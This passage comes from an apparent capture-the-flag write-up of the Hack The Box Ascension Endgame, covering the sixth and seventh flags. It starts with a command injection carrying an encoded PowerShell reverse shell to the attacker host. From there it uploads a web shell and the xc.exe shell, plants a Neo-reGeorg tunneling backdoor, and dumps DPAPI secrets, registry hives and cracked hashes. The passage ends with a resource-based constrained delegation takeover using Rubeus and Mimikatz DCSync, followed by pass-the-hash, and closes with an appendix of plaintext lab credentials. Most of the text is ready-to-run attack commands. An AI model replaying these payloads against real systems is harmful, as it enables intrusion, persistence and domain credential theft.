To get the shell as the *1st* user I will upload `xc.exe` binary via the CMDi and run it in the background (to serve files I installed Python 2 with the official [MSI installer](https://www.python.org/downloads/release/python-2718/) and used the native SimpleHTTPSever module):

```
foo || powershell -exec bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADEAMQAuADYAJwAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAIwAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA= || bar

PS > IWR -Uri "http://192.168.11.6:8080/cmd.aspx" -OutFile "c:\inetpub\wwwroot\snovvcrash.aspx"
PS > IWR -Uri "http://192.168.11.6:8080/xc.exe" -OutFile "c:\users\elliot\music\xc.exe"
```

![ms01-xc-elliot.png](/assets/images/htb/endgames/ascension/ms01-xc-elliot.png)
{:.center-image}

To get the shell as the *2nd* user I will upload an ASPX [web shell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx) and then proceed to uploading `xc.exe` again from it:

```
$ cat a
IWR -Uri "http://192.168.11.6:8080/xc.exe" -OutFile "c:\Windows\System32\spool\drivers\color\xc.exe"
$ echo 'powershell -enc ' `cat a | iconv -t UTF-16LE | base64 -w0`
powershell -enc SQBXAFIAIAAtAFUAcgBpACAAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADEALgA2ADoAOAAwADgAMAAvAHgAYwAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAGMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABzAHAAbwBvAGwAXABkAHIAaQB2AGUAcgBzAFwAYwBvAGwAbwByAFwAeABjAC4AZQB4AGUAIgAKAA==
$ cat a
Start-Process -NoNewWindow c:\Windows\System32\spool\drivers\color\xc.exe "192.168.11.6 9004"
$ echo 'powershell -enc ' `cat a | iconv -t UTF-16LE | base64 -w0`
powershell -enc  UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ATgBvAE4AZQB3AFcAaQBuAGQAbwB3ACAAYwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHMAcABvAG8AbABcAGQAcgBpAHYAZQByAHMAXABjAG8AbABvAHIAXAB4AGMALgBlAHgAZQAgACIAMQA5ADIALgAxADYAOAAuADEAMQAuADYAIAA5ADAAMAA0ACIACgA=
```

![ms01-xc-defaultapppool.png](/assets/images/htb/endgames/ascension/ms01-xc-defaultapppool.png)
{:.center-image}

:warning: ***Spoiler.*** *Shell as IIS APPPOOL\defaultapppool will make no use for us here. `SeImpersonatePrivilege` is not exploitable on this server afaik, since the only available machine on the network is DC1 which is not a helper for RoguePotato, see [this blogpost](https://clubby789.me/netsh/).*

Unfortunately, the first shell as MEGAAIRLINE\elliot was dying every time the web request timed out, so I had to use forward local SSH service on MS01 and connect to it as elliot:

```
[xc: C:\windows\system32\inetsrv]: !lfwd 2222 127.0.0.1 22
Cmd > ssh megaairline\elliot@127.0.0.1 -p 2222
```

![ms01-xc-ssh-fwd.png](/assets/images/htb/endgames/ascension/ms01-xc-ssh-fwd.png)
{:.center-image}

Looking around on the box, we will see that there's another elliot user – in local administrators group this time. Also there's this Slack installer which is a hint for the next flag...

![ms01-enum.png](/assets/images/htb/endgames/ascension/ms01-enum.png)
{:.center-image}

After running winPEAS and a bit of googling I found out that Slack leaves sensitive artifacts in `%LOCALAPPDATA%` Chrome's DB 🠚 [APPDATA OH MY... OH NO!](https://www.snowfroc.com/2020_Presentations/AppData%20Oh%20My...%20Oh%20No!.pdf)

![ms01-slack-blob-locate.png](/assets/images/htb/endgames/ascension/ms01-slack-blob-locate.png)
{:.center-image}

I will pull it from the remote via SCP (**\<sarcasm\>**Windows OpenSSH SCP Syntax is awesome when dealing with spaces is path, btw**\</sarcasm\>**):

```
Cmd > scp -P 2222 megaairline.local\elliot@127.0.0.1:"\"\"C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00\7\"\"" slack.blob
```

![ms01-slack-blob-pull.png](/assets/images/htb/endgames/ascension/ms01-slack-blob-pull.png)
{:.center-image}

I will do `strings`the blob on Kali and get another password.

![slack-blob-strings.png](/assets/images/htb/endgames/ascension/slack-blob-strings.png)
{:.center-image}

Before going further I will build another tunnel to interact with 192.168.11.x network directly from Kali. I could create a path all the way back from MS01 over DC1 to WEB01 with SSH or Chisel (as I've described [in this example](https://snovvcra.sh/PPN/#local-vs-remote-port-forwarding)), but I feel lazy and will do it another way.

There is IIS running on MS01 which makes it a perfect target for tunneling with [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md). I will generate the `tunnel.aspx` backdoor, drop it into `\inetpub\wwwroot` on MS01 and start a SOCKS proxy at `192.168.10.6:1337`. Using proxychains (as the name suggests) I will be able to *chain* multiple proxy servers to reach targets in 192.168.11.x.

Neo-reGeorg requires Python 2 as well as the `requests` module. I will download all the dependencies with pip on Kali, zip them and transfer to DC1:

```
$ pip download requests
$ zip requests.zip *
```

![neo-regeorg-pip-download.png](/assets/images/htb/endgames/ascension/neo-regeorg-pip-download.png)
{:.center-image}

On DC1 I will unzip `requests` dependencies and install them like follows:

```
Cmd > C:\Python27\Scripts\pip.exe install --no-index --find-links "C:\Users\Administrator\Music\requests" requests
```

Now, back on Kali, I will generate the `tunnel.aspx` backdoor:

```
$ python neoreg.py generate -k 'snovvcrash.rocks!'
```

![neo-regeorg-generate.png](/assets/images/htb/endgames/ascension/neo-regeorg-generate.png)
{:.center-image}

Then I will upload all the files to their places and run `neoreg.py` on DC1:

```
Cmd > scp -P 2222 tunnel.aspx megaairline.local\elliot@127.0.0.1:"C:\inetpub\wwwroot\tunnel.aspx"
Cmd > C:\Python27\Scripts\python.exe .\neoreg.py -k snovvcrash.rocks! -u http://ms01.megaairline.local/tunnel.aspx -l 0.0.0.0 -p 1337
```

![neo-regeorg-socks.png](/assets/images/htb/endgames/ascension/neo-regeorg-socks.png)
{:.center-image}

On Kali I will make a copy of proxychains config in CWD, modify it to use a chain of 2 proxies and verify elliot's local password with CME:

```
$ proxychains4 -f ./proxychains4.conf cme smb 192.168.11.210 -u elliot -p 'LetMeInAgain!' --local-auth
```

![proxychains-chain.png](/assets/images/htb/endgames/ascension/proxychains-chain.png)
{:.center-image}

We don't receive "Pwn3d!" here due to [UAC token filtering](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/) (elliot is not the RID 500 local admin), but as we saw earlier he **is** a member of local administrators group.

I will  RDP into MS01 and grab the fifth flag:

```
$ proxychains4 -q -f ./proxychains4.conf xfreerdp /u:'elliot' /p:'LetMeInAgain!' /v:192.168.11.210 /dynamic-resolution +clipboard /drive:share,/home/snovvcrash/htb/endgames/ascension/www
```

![flag-6.png](/assets/images/htb/endgames/ascension/flag-6.png)
{:.center-image}

## !Flag

```
ASCENSION{sL4ck1ng_0n_***********}
```

# 7. Maverick

Being the local administrator on MS01, I will exfiltrate some extra creds with SharpDPAPI (again).

![ms01-sharpdpapi.png](/assets/images/htb/endgames/ascension/ms01-sharpdpapi.png)
{:.center-image}

I will also grab SAM, SYSTEM and SECURITY registry hives and decrypt other local secrets.

![ms01-registry-hives.png](/assets/images/htb/endgames/ascension/ms01-registry-hives.png)
{:.center-image}

Performing Credential Stuffing, I will find out that `MEGAAIRLINE\anna` user reuses her credentials for the builtin administrator account:

```
$ hashcat64.exe -m 2100 hashes/htb w --username
```

![hashcat-dcc2.png](/assets/images/htb/endgames/ascension/hashcat-dcc2.png)
{:.center-image}

Observing anna's privileges in Bloodhound, the rest turns out to be trivial – RBCD's coming!!

![bh-anna.png](/assets/images/htb/endgames/ascension/bh-anna.png)
{:.center-image}

I am not able to authenticate nether from MS01 or from DC2 as MEGAAIRLINE\anna due to some policy restrictions (`runas /netonly` or [NamedPipePTH](https://github.com/S3cur3Th1sSh1t/NamedPipePTH) does not work either), so I will have to figure out the way to use anna's creds.

![dc1-anna-log-on-error.png](/assets/images/htb/endgames/ascension/dc1-anna-log-on-error.png)
{:.center-image}

I can use [Rubeus](https://github.com/GhostPack/Rubeus) `asktgt` in this situation to request Kerberos TGT and legitimately impersonate anna via Pass-the-Ticket. I also thought that doing Overpass-the-Hash with Mimikatz `sekurlsa::pth` will work, but it does not seem it does.

![mimikatz-vs-rubeus.png](/assets/images/htb/endgames/ascension/mimikatz-vs-rubeus.png)
{:.center-image}

I suppose the Mimikatz approach fails due to the nature of `sekurlsa::pth` module which injects the hash directly into LSASS memory, when Rubeus *"causes the normal Kerberos authentication process to kick off as normal  as if the user had normally logged on, turning the supplied hash into a  fully-fledged TGT"* ([ref](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash)).

Anyways, now I can do all the RBCD stuff right from DC1.daedalus.local:

```
Cmd > .\Rubeus.exe asktgt /domain:megaairline.local /dc:dc2 /user:anna /password:FWErfsgt4ghd7f6dwx /createnetonly:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /show
```

```
PS > . .\powermad.ps1
PS > . .\powerview4.ps1
PS > New-MachineAccount -MachineAccount iLovePizza -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) -Verbose -Domain megaairline.local -DomainController DC2.megaairline.local
PS > Set-DomainRBCD DC2 -DelegateFrom iLovePizza -Domain megaairline.local -Server DC2.megaairline.local -Verbose
PS > .\Rubeus.exe s4u /domain:megaairline.local /dc:DC2 /user:iLovePizza /rc4:FC525C9683E8FE067095BA2DDC971889 /impersonateuser:administrator /msdsspn:CIFS/DC2.megaairline.local /ptt /nowrap
PS > cd \\dc2.megaairline.local\c$
...
PS > c:
PS > .\Rubeus.exe s4u /domain:megaairline.local /dc:DC2 /user:iLovePizza /rc4:FC525C9683E8FE067095BA2DDC971889 /impersonateuser:administrator /msdsspn:CIFS/DC2.megaairline.local /altservice:LDAP /ptt /nowrap
PS > .\mimikatz.exe "log dcsync.txt" "lsadump::dcsync /domain:megaairline.local /user:administrator /all /cvs" "exit"
```

![dc1-rbcd-1.png](/assets/images/htb/endgames/ascension/dc1-rbcd-1.png)
{:.center-image}

![dc1-rbcd-2.png](/assets/images/htb/endgames/ascension/dc1-rbcd-2.png)
{:.center-image}

![dc1-rbcd-3.png](/assets/images/htb/endgames/ascension/dc1-rbcd-3.png)
{:.center-image}

![dc1-rbcd-4.png](/assets/images/htb/endgames/ascension/dc1-rbcd-4.png)
{:.center-image}

Having obtained the full DCSync dump, I can use impacket to log into DC2 through double hop proxy via WMI:

```
$ proxychains4 -f ./proxychains4.conf wmiexec.py MEGAAIRLINE/administrator@192.168.11.201  -hashes :674f1a5c73f4faad8ddbf7f3bf86db60 -shell-type powershell
```

![flag-7.png](/assets/images/htb/endgames/ascension/flag-7.png)
{:.center-image}

:shell: ***Feature.*** *Check out the `-shell-type` [feature](https://github.com/SecureAuthCorp/impacket/commit/a16198c3312d8cfe25b329907b16463ea3143519) of mine to spawn a PowerShell shell via impacket's \*exec.py scripts!*

## !Flag

```
ASCENSION{g0t_a1L_********}
```

# Appendix

## A. Creds

```
MSSQL:daedalus:L3tM3FlyUpH1gh
MSSQL:sa:MySAisL33TM4n
WEB01\svc_dev:a2W@rWAHzG+zQrB4
WEB01\Administrator:EXuLyX_WtHxx9pS9
DAEDALUS\billing_user:D43d4lusB1ll1ngB055
DAEDALUS\svc_backup:jkQXAnHKj#7w#XS$
DAEDALUS\elliot:84@m!n@9
DAEDALUS\Administrator:pleasefastenyourseatbelts01!
MEGAAIRLINES\elliot:84@m!n@9
MS01\elliot:LetMeInAgain!
MS01\Administrator:FWErfsgt4ghd7f6dwx
MEGAAIRLINES\anna:FWErfsgt4ghd7f6dwx
```
